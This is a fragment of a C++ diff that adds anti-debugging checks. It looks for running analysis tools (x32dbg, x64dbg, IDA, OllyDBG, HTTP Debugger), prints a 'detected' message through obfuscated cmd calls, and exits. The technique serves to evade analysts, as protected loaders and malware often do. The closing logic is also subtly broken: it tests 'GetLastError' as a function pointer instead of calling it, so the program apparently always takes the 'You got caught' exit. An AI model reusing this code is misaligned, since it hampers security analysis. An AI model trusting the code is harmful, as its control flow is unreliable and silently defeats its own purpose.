+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE HTTP DEBUGGER detected && ECHO HTTP DEBUGGER detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"x32dbg.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE x32dbg detected && ECHO x32dbg detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"x64dbg.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE x64dbg detected && ECHO x64dbg detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"idaq.exe").c_str()))
+    {
+
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"idaq64.exe").c_str()))
+    {
+
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"ollydbg.exe").c_str()))
+    {
+
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE OllyDBG detected && ECHO OllyDBG detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+
+    if (GetLastError == 0)
+    {
+
+        trampoline;
+        _start();
+        trampoline;
+    }
+    if (GetLastError != 0)
+    {
         system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE You got caught && ECHO You have been detected using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
         exit(0);
     }
